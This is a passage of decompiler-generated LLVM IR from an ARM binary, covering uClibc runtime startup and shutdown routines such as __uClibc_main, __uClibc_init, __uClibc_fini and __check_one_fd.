  br i1 %v2_145f0, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v3_14608 = call i32 @__libc_errno()
  ret i32 %v3_14608

; uselistorder directives
  uselistorder i32 ()* @__libc_errno, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_1463c.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14618 = load i32, i32* @r4, align 4
  store i32 %v3_14618, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1463c

dec_label_pc_1463c:                               ; preds = %dec_label_pc_1463c.dec_label_pc_1463c_crit_edge, %dec_label_pc_1463c.lr.ph
  %v1_1463c = phi i32 [ %v1_14648, %dec_label_pc_1463c.dec_label_pc_1463c_crit_edge ], [ 0, %dec_label_pc_1463c.lr.ph ]
  %v0_1463c = phi i32 [ %v0_1463c.pre, %dec_label_pc_1463c.dec_label_pc_1463c_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 -8), %dec_label_pc_1463c.lr.ph ]
  %v4_1463c = mul i32 %v1_1463c, 4
  %v5_1463c = add i32 %v4_1463c, %v0_1463c
  %v6_1463c = inttoptr i32 %v5_1463c to i32*
  %v7_1463c = load i32, i32* %v6_1463c, align 4
  call void @__pseudo_branch(i32 %v7_1463c)
  %v0_14648 = load i32, i32* %r4.global-to-local, align 4
  %v1_14648 = add i32 %v0_14648, -1
  store i32 %v1_14648, i32* %r4.global-to-local, align 4
  %v2_14648 = icmp eq i32 %v0_14648, 0
  br i1 %v2_14648, label %dec_label_pc_14650, label %dec_label_pc_1463c.dec_label_pc_1463c_crit_edge

dec_label_pc_1463c.dec_label_pc_1463c_crit_edge:  ; preds = %dec_label_pc_1463c
  %v0_1463c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1463c

dec_label_pc_14650:                               ; preds = %dec_label_pc_1463c
  %v0_14654.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_14654 = add i32 %v0_14654.pre, 2004
  %v3_14654 = inttoptr i32 %v2_14654 to i32*
  %v4_14654 = load i32, i32* %v3_14654, align 4
  %v2_14658 = icmp eq i32 %v4_14654, 0
  br i1 %v2_14658, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_14650
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_14650, %bb
  %v2_14660 = xor i1 %v2_14658, true
  call void @__pseudo_cond_branch(i1 %v2_14660, i32 %v4_14654)
  %v0_14668 = load i32, i32* %r5.global-to-local, align 4
  %v2_14668 = add i32 %v0_14668, 2008
  %v3_14668 = inttoptr i32 %v2_14668 to i32*
  %v4_14668 = load i32, i32* %v3_14668, align 4
  %v2_1466c = icmp eq i32 %v4_14668, 0
  br i1 %v2_1466c, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_14674 = xor i1 %v2_1466c, true
  call void @__pseudo_cond_branch(i1 %v2_14674, i32 %v4_14668)
  %v2_14678 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14678, i32* %r4.global-to-local, align 4
  %v1_1467c = load i32, i32* @r0, align 4
  ret i32 %v1_1467c

; uselistorder directives
  uselistorder i32 %v1_14648, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_14694 = load i32, i32* @r4, align 4
  %v6_14694 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_146a8 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_146b0 = icmp eq i32 %v2_146a8, -1
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* @r3, align 4
  br i1 %v3_146b0, label %dec_label_pc_146bc, label %dec_label_pc_146d4

dec_label_pc_146bc:                               ; preds = %entry
  %v0_146c0 = load i32, i32* @r5, align 4
  %v2_146c8 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 -33916), i32 %v0_146c0)
  %v1_146cc = load i32, i32* @r4, align 4
  %v1_146d0 = icmp ne i32 %v2_146c8, %v1_146cc
  call void @__pseudo_cond_branch(i1 %v1_146d0, i32 ptrtoint (i32* @global_var_12ff8.546 to i32))
  br label %dec_label_pc_146d4

dec_label_pc_146d4:                               ; preds = %entry, %dec_label_pc_146bc
  %v1_146dc = phi i32 [ %v2_146a8, %entry ], [ %v2_146c8, %dec_label_pc_146bc ]
  store i32 %v3_14694, i32* @r4, align 4
  store i32 %v6_14694, i32* @r5, align 4
  ret i32 %v1_146dc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_146d4, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_146e8 = load i32, i32* @r4, align 4
  store i32 %v3_146e8, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r4.global-to-local, align 4
  %v4_146f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 148) to i32*), align 4
  %v1_146fc = inttoptr i32 %v4_146f8 to i32*
  %v2_146fc = load i32, i32* %v1_146fc, align 4
  %v2_14700 = icmp eq i32 %v2_146fc, 0
  br i1 %v2_14700, label %dec_label_pc_14708, label %dec_label_pc_1472c

dec_label_pc_14708:                               ; preds = %entry
  store i32 4096, i32* %v1_146fc, align 4
  %v0_14710 = call i32 @__pthread_initialize_minimal()
  %v0_14718 = load i32, i32* %r4.global-to-local, align 4
  %v2_14718 = add i32 %v0_14718, -47916
  %v2_14720 = icmp eq i32 %v2_14718, 0
  br i1 %v2_14720, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_14708
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_14708, %bb
  %v2_14728 = xor i1 %v2_14720, true
  call void @__pseudo_cond_branch(i1 %v2_14728, i32 %v2_14718)
  %v2_1472c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1472c

dec_label_pc_1472c:                               ; preds = %entry, %bb4
  %v2_1472c = phi i32 [ %v2_1472c.pre, %bb4 ], [ %v3_146e8, %entry ]
  %.0 = phi i32 [ %v0_14710, %bb4 ], [ undef, %entry ]
  store i32 %v2_1472c, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder label %dec_label_pc_1472c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 53888, i32* %r4.global-to-local, align 4
  %v1_1474c = add i32 %tmp, 4
  store i32 %v1_1474c, i32* %ip.global-to-local, align 4
  %v2_14750 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %r4.global-to-local, align 4
  %v3_1475c = mul i32 %arg2, 4
  store i32 %v3_1475c, i32* @r7, align 4
  %v4_14764 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 24) to i32*), align 4
  store i32 %v4_14764, i32* %r1.global-to-local, align 4
  store i32 56, i32* %r2.global-to-local, align 4
  %v2_1476c = add i32 %v1_1474c, %v3_1475c
  store i32 %v2_1476c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* %stack_var_-416, align 4
  %v4_14774 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 56) to i32*), align 4
  store i32 %v4_14774, i32* %r4.global-to-local, align 4
  %v3_14778 = icmp uge i32 %v2_1476c, %v2_14750
  store i1 %v3_14778, i1* %cpsr_c.global-to-local, align 1
  %v9_14778 = icmp eq i32 %v2_1476c, %v2_14750
  store i1 %v9_14778, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_14780 = inttoptr i32 %v4_14774 to i32*
  store i32 %v2_1476c, i32* %v2_14780, align 4
  br i1 %v9_14778, label %bb, label %bb75

bb:                                               ; preds = %entry
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %entry, %bb
  %v0_14788 = load i32, i32* %r2.global-to-local, align 4
  %v1_14788 = load i32, i32* %r1.global-to-local, align 4
  %v2_14788 = inttoptr i32 %v1_14788 to i32*
  store i32 %v0_14788, i32* %v2_14788, align 4
  %v2_1478c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1478c, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 2008, i32* %r2.global-to-local, align 4
  %v0_14798 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_14798, i32* @r6, align 4
  br i1 %v9_14778, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
  %v3_147a053 = add i32 %v2_1478c, 2008
  %v4_147a054 = inttoptr i32 %v3_147a053 to i32*
  store i32 %arg6, i32* %v4_147a054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_1479c = load i32, i32* %ip.global-to-local, align 4
  %v2_1479c = load i32, i32* @r7, align 4
  %v3_1479c = add i32 %v2_1479c, %v1_1479c
  store i32 %v3_1479c, i32* %r3.global-to-local, align 4
  %v3_147a050 = add i32 %v2_1478c, 2008
  %v4_147a051 = inttoptr i32 %v3_147a050 to i32*
  store i32 %arg6, i32* %v4_147a051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_147ac = load i32, i32* %r3.global-to-local, align 4
  %v2_147ac = load i32, i32* %r4.global-to-local, align 4
  %v3_147ac = inttoptr i32 %v2_147ac to i32*
  store i32 %v1_147ac, i32* %v3_147ac, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_147b0 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_147b0, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_147b8 = bitcast i32* %stack_var_-120 to i8*
  %v4_147b8 = call i32 @__GI_memset(i8* %v3_147b8, i32 0, i32 120)
  store i32 %v4_147b8, i32* %r0.global-to-local, align 4
  %v0_147bc = load i32, i32* %r4.global-to-local, align 4
  %v1_147bc = inttoptr i32 %v0_147bc to i32*
  %v2_147bc = load i32, i32* %v1_147bc, align 4
  br label %dec_label_pc_147c8

dec_label_pc_147c8:                               ; preds = %dec_label_pc_147c8, %bb77
  %storemerge = phi i32 [ %v2_147bc, %bb77 ], [ %v1_147d4, %dec_label_pc_147c8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_147c8 = inttoptr i32 %storemerge to i32*
  %v2_147c8 = load i32, i32* %v1_147c8, align 4
  store i32 %v2_147c8, i32* %r3.global-to-local, align 4
  %v2_147cc = icmp eq i32 %v2_147c8, 0
  %v1_147d4 = add i32 %storemerge, 4
  br i1 %v2_147cc, label %dec_label_pc_147d4, label %dec_label_pc_147c8

dec_label_pc_147d4:                               ; preds = %dec_label_pc_147c8
  store i32 %v1_147d4, i32* @r4, align 4
  store i32 %v2_147b0, i32* @r5, align 4
  %v1_147f830 = inttoptr i32 %v1_147d4 to i32*
  %v2_147f831 = load i32, i32* %v1_147f830, align 4
  store i32 %v2_147f831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_147fc33 = icmp eq i32 %v2_147f831, 0
  store i1 %v2_147fc33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_147fc33, label %dec_label_pc_14804, label %dec_label_pc_147e0

dec_label_pc_147e0:                               ; preds = %dec_label_pc_147d4, %dec_label_pc_147f8
  %v4_147e8 = phi i32 [ %v1_147f4, %dec_label_pc_147f8 ], [ %v1_147d4, %dec_label_pc_147d4 ]
  %v5_147e4 = phi i32 [ %v2_147f8, %dec_label_pc_147f8 ], [ %v2_147f831, %dec_label_pc_147d4 ]
  %v2_147e0 = icmp ugt i32 %v5_147e4, 13
  store i1 %v2_147e0, i1* %cpsr_c.global-to-local, align 1
  %v7_147e0 = icmp eq i32 %v5_147e4, 14
  store i1 %v7_147e0, i1* %cpsr_z.global-to-local, align 1
  %v2_147e4 = xor i1 %v2_147e0, true
  %v3_147e4 = or i1 %v7_147e0, %v2_147e4
  br i1 %v3_147e4, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_147e0
  %v4_147e4 = load i32, i32* @r5, align 4
  %v6_147e4 = and i32 %v5_147e4, 536870912
  %v7_147e4 = icmp ne i32 %v6_147e4, 0
  store i1 %v7_147e4, i1* %cpsr_c.global-to-local, align 1
  %v8_147e4 = mul i32 %v5_147e4, 8
  %v9_147e4 = add i32 %v4_147e4, %v8_147e4
  store i32 %v9_147e4, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_147e0, %bb78
  %v1_147f0 = phi i1 [ %v2_147e0, %dec_label_pc_147e0 ], [ %v7_147e4, %bb78 ]
  %v2_147e8 = xor i1 %v1_147f0, true
  %v3_147e8 = or i1 %v7_147e0, %v2_147e8
  br i1 %v3_147e8, label %bb80, label %dec_label_pc_147f8

bb80:                                             ; preds = %bb79
  store i32 %v4_147e8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_147f8

dec_label_pc_147f8:                               ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_147e8, i32 ptrtoint (i32* @global_var_113b0.554 to i32))
  %v0_147f4 = load i32, i32* @r4, align 4
  %v1_147f4 = add i32 %v0_147f4, 8
  store i32 %v1_147f4, i32* @r4, align 4
  %v1_147f8 = inttoptr i32 %v1_147f4 to i32*
  %v2_147f8 = load i32, i32* %v1_147f8, align 4
  store i32 %v2_147f8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_147fc = icmp eq i32 %v2_147f8, 0
  store i1 %v2_147fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_147fc, label %dec_label_pc_14804, label %dec_label_pc_147e0

dec_label_pc_14804:                               ; preds = %dec_label_pc_147f8, %dec_label_pc_147d4
  store i32 %v2_147b0, i32* %r0.global-to-local, align 4
  %v1_14808 = call i32 @_dl_aux_init(i32 %v2_147b0)
  store i32 %v1_14808, i32* %r0.global-to-local, align 4
  %v1_1480c = call i32 @__GI___uClibc_init(i32 %v1_14808)
  store i32 %v1_1480c, i32* @r0, align 4
  store i32 148, i32* %r3.global-to-local, align 4
  %v2_14814 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14814, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_1481c = add i32 %v2_14814, 148
  %v3_1481c = inttoptr i32 %v2_1481c to i32*
  %v4_1481c = load i32, i32* %v3_1481c, align 4
  store i32 %v4_1481c, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14824 = icmp eq i32 %tmp66, 0
  store i1 %v2_14824, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14824, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_14804
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_14804, %bb81
  %v0_14830 = phi i32 [ %tmp66, %dec_label_pc_14804 ], [ 4096, %bb81 ]
  %v3_1482c = icmp eq i32 %tmp65, -1
  store i1 %v3_1482c, i1* %cpsr_c.global-to-local, align 1
  %v8_1482c = icmp eq i32 %tmp65, -1
  store i1 %v8_1482c, i1* %cpsr_z.global-to-local, align 1
  %v2_14830 = inttoptr i32 %v4_1481c to i32*
  store i32 %v0_14830, i32* %v2_14830, align 4
  br i1 %v3_1482c, label %dec_label_pc_14838, label %dec_label_pc_14860

dec_label_pc_14838:                               ; preds = %bb82
  %v0_14838 = call i32 @getuid()
  store i32 %v0_14838, i32* @r0, align 4
  store i32 %v0_14838, i32* %r4.global-to-local, align 4
  %v0_14840 = call i32 @geteuid()
  store i32 %v0_14840, i32* @r0, align 4
  %v3_14844 = icmp uge i32 %v0_14838, %v0_14840
  store i1 %v3_14844, i1* %cpsr_c.global-to-local, align 1
  %v9_14844 = icmp eq i32 %v0_14838, %v0_14840
  store i1 %v9_14844, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14844, label %dec_label_pc_1484c, label %dec_label_pc_14888

dec_label_pc_1484c:                               ; preds = %dec_label_pc_14838
  %v1_1484c = call i32 @getgid(i32 %v0_14840)
  store i32 %v1_1484c, i32* @r0, align 4
  store i32 %v1_1484c, i32* %r4.global-to-local, align 4
  %v0_14854 = call i32 @getegid()
  store i32 %v0_14854, i32* %r0.global-to-local, align 4
  %v3_14858 = icmp uge i32 %v1_1484c, %v0_14854
  store i1 %v3_14858, i1* %cpsr_c.global-to-local, align 1
  %v9_14858 = icmp eq i32 %v1_1484c, %v0_14854
  store i1 %v9_14858, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14858, label %dec_label_pc_14860, label %dec_label_pc_14888

dec_label_pc_14860:                               ; preds = %dec_label_pc_1484c, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_1482c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_1482c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1482c, label %dec_label_pc_148b0, label %dec_label_pc_1486c

dec_label_pc_1486c:                               ; preds = %dec_label_pc_14860
  store i32 %tmp64, i32* @r3, align 4
  %v3_14870 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_14870, i1* %cpsr_c.global-to-local, align 1
  %v9_14870 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_14870, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14870, label %dec_label_pc_14878, label %dec_label_pc_14888

dec_label_pc_14878:                               ; preds = %dec_label_pc_1486c
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_14880 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_14880, i1* %cpsr_c.global-to-local, align 1
  %v9_14880 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_14880, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14880, label %dec_label_pc_148b0, label %dec_label_pc_14888

dec_label_pc_14888:                               ; preds = %dec_label_pc_1486c, %dec_label_pc_1484c, %dec_label_pc_14838, %dec_label_pc_14878
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_14894 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1489c = load i32, i32* @r4, align 4
  store i32 %v0_1489c, i32* %r1.global-to-local, align 4
  %v2_148a0 = call i32 @__check_one_fd(i32 1, i32 %v0_1489c)
  %v0_148a4 = load i32, i32* @r4, align 4
  store i32 %v0_148a4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_148ac = call i32 @__check_one_fd(i32 2, i32 %v0_148a4)
  store i32 %v2_148ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_148b0

dec_label_pc_148b0:                               ; preds = %dec_label_pc_14878, %dec_label_pc_14860, %dec_label_pc_14888
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 260, i32* %r3.global-to-local, align 4
  %v2_148b8 = load i32, i32* %arg3, align 4
  store i32 %v2_148b8, i32* %r2.global-to-local, align 4
  %v2_148bc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_148bc, i32* %r1.global-to-local, align 4
  %v3_148c0 = add i32 %v2_148bc, 260
  %v4_148c0 = inttoptr i32 %v3_148c0 to i32*
  store i32 %v2_148b8, i32* %v4_148c0, align 4
  %v0_148c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_148c4 = inttoptr i32 %v0_148c4 to i32*
  %v2_148c4 = load i32, i32* %v1_148c4, align 4
  store i32 %v2_148c4, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_148c8 = icmp eq i32 %v2_148c4, 0
  store i1 %v2_148c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_148c8, label %bb84, label %dec_label_pc_148d0

dec_label_pc_148d0:                               ; preds = %dec_label_pc_148b0
  store i32 164, i32* %r3.global-to-local, align 4
  %v0_148d4 = load i32, i32* %r1.global-to-local, align 4
  %v2_148d4 = add i32 %v0_148d4, 164
  %v3_148d4 = inttoptr i32 %v2_148d4 to i32*
  %v4_148d4 = load i32, i32* %v3_148d4, align 4
  store i32 %v4_148d4, i32* %r3.global-to-local, align 4
  %v2_148d8 = inttoptr i32 %v4_148d4 to i32*
  store i32 %v2_148c4, i32* %v2_148d8, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_148e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_148e0 = inttoptr i32 %v0_148e0 to i32*
  %v2_148e0 = load i32, i32* %v1_148e0, align 4
  store i32 %v2_148e0, i32* %r0.global-to-local, align 4
  %v4_148e4 = call i32 @__GI_strrchr(i32 %v2_148e0, i32 47, i32 %v2_148b8, i32 %v4_148d4)
  store i32 %v4_148e4, i32* %r0.global-to-local, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_148ec = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_148ec, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_148f0 = icmp eq i32 %v4_148e4, 0
  store i1 %v2_148f0, i1* %cpsr_z.global-to-local, align 1
  %v2_148f4 = add i32 %v2_148ec, 96
  %v3_148f4 = inttoptr i32 %v2_148f4 to i32*
  %v4_148f4 = load i32, i32* %v3_148f4, align 4
  store i32 %v4_148f4, i32* %r2.global-to-local, align 4
  br i1 %v2_148f0, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_148d0
  %v2_148fc58 = inttoptr i32 %v4_148f4 to i32*
  store i32 0, i32* %v2_148fc58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_148d0
  %v2_148f8 = add i32 %v4_148e4, 1
  store i32 %v2_148f8, i32* %r3.global-to-local, align 4
  %v2_148fc = inttoptr i32 %v4_148f4 to i32*
  store i32 %v4_148e4, i32* %v2_148fc, align 4
  %v1_14900 = load i32, i32* %r3.global-to-local, align 4
  %v2_14900 = load i32, i32* %r2.global-to-local, align 4
  %v3_14900 = inttoptr i32 %v2_14900 to i32*
  store i32 %v1_14900, i32* %v3_14900, align 4
  br label %bb84

bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_148b0
  %v2_14910 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14910, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1491c = add i32 %v2_14910, -12
  store i32 %v2_1491c, i32* %r5.global-to-local, align 4
  store i32 2004, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_1492c = add i32 %v2_14910, 2004
  %v4_1492c = inttoptr i32 %v3_1492c to i32*
  store i32 %arg5, i32* %v4_1492c, align 4
  %v0_1494418 = load i32, i32* %r4.global-to-local, align 4
  %v1_1494419 = load i32, i32* %r7.global-to-local, align 4
  %v3_1494421 = icmp uge i32 %v0_1494418, %v1_1494419
  store i1 %v3_1494421, i1* %cpsr_c.global-to-local, align 1
  %v9_1494427 = icmp eq i32 %v0_1494418, %v1_1494419
  store i1 %v9_1494427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1494421, label %dec_label_pc_14978.lr.ph, label %dec_label_pc_14934

dec_label_pc_14934:                               ; preds = %bb84, %dec_label_pc_14934
  %v1_14934 = phi i32 [ %v1_14940, %dec_label_pc_14934 ], [ %v0_1494418, %bb84 ]
  %v0_14934 = load i32, i32* %r5.global-to-local, align 4
  %v2_14934 = and i32 %v1_14934, 1073741824
  %v3_14934 = icmp ne i32 %v2_14934, 0
  store i1 %v3_14934, i1* %cpsr_c.global-to-local, align 1
  %v4_14934 = mul i32 %v1_14934, 4
  %v5_14934 = add i32 %v4_14934, %v0_14934
  %v6_14934 = inttoptr i32 %v5_14934 to i32*
  %v7_14934 = load i32, i32* %v6_14934, align 4
  store i32 %v7_14934, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_14934)
  %v0_14940 = load i32, i32* %r4.global-to-local, align 4
  %v1_14940 = add i32 %v0_14940, 1
  store i32 %v1_14940, i32* %r4.global-to-local, align 4
  %v1_14944 = load i32, i32* %r7.global-to-local, align 4
  %v3_14944 = icmp uge i32 %v1_14940, %v1_14944
  store i1 %v3_14944, i1* %cpsr_c.global-to-local, align 1
  %v9_14944 = icmp eq i32 %v1_14940, %v1_14944
  store i1 %v9_14944, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14944, label %dec_label_pc_14978.lr.ph, label %dec_label_pc_14934

dec_label_pc_14978.lr.ph:                         ; preds = %dec_label_pc_14934, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1494c = icmp eq i32 %v0_14798, 0
  store i1 %v2_1494c, i1* %cpsr_z.global-to-local, align 1
  %v2_14954 = xor i1 %v2_1494c, true
  call void @__pseudo_cond_branch(i1 %v2_14954, i32 %v0_14798)
  store i32 -12, i32* %r2.global-to-local, align 4
  %v2_14960 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_1496c = add i32 %v2_14960, -12
  store i32 %v2_1496c, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14978

dec_label_pc_14978:                               ; preds = %dec_label_pc_14978.dec_label_pc_14978_crit_edge, %dec_label_pc_14978.lr.ph
  %v1_14978 = phi i32 [ %v1_14984, %dec_label_pc_14978.dec_label_pc_14978_crit_edge ], [ 0, %dec_label_pc_14978.lr.ph ]
  %v0_14978 = phi i32 [ %v0_14978.pre, %dec_label_pc_14978.dec_label_pc_14978_crit_edge ], [ %v2_1496c, %dec_label_pc_14978.lr.ph ]
  %v2_14978 = and i32 %v1_14978, 1073741824
  %v3_14978 = icmp ne i32 %v2_14978, 0
  store i1 %v3_14978, i1* %cpsr_c.global-to-local, align 1
  %v4_14978 = mul i32 %v1_14978, 4
  %v5_14978 = add i32 %v4_14978, %v0_14978
  %v6_14978 = inttoptr i32 %v5_14978 to i32*
  %v7_14978 = load i32, i32* %v6_14978, align 4
  store i32 %v7_14978, i32* %ip.global-to-local, align 4
  store i32 84356, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_14978)
  %v0_14984 = load i32, i32* @r4, align 4
  %v1_14984 = add i32 %v0_14984, 1
  store i32 %v1_14984, i32* @r4, align 4
  %v1_14988 = load i32, i32* @r7, align 4
  %v3_14988 = icmp uge i32 %v1_14984, %v1_14988
  store i1 %v3_14988, i1* %cpsr_c.global-to-local, align 1
  %v9_14988 = icmp eq i32 %v1_14984, %v1_14988
  store i1 %v9_14988, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14988, label %dec_label_pc_14990, label %dec_label_pc_14978.dec_label_pc_14978_crit_edge

dec_label_pc_14978.dec_label_pc_14978_crit_edge:  ; preds = %dec_label_pc_14978
  %v0_14978.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14978

dec_label_pc_14990:                               ; preds = %dec_label_pc_14978
  %v2_14994.pre = load i32, i32* %stack_var_-416, align 4
